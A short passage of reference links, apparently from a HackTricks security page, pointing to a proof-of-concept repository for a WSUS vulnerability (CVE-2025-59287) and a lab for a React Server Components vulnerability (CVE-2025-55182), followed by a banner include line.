- [PoC – tecxx/CVE-2025-59287-WSUS](https://github.com/tecxx/CVE-2025-59287-WSUS)
- [RSC Report Lab – CVE-2025-55182 (React 19.2.0)](https://github.com/ghe770mvp/RSC_Vuln_Lab)

{{#include ../../banners/hacktricks-training.md}}
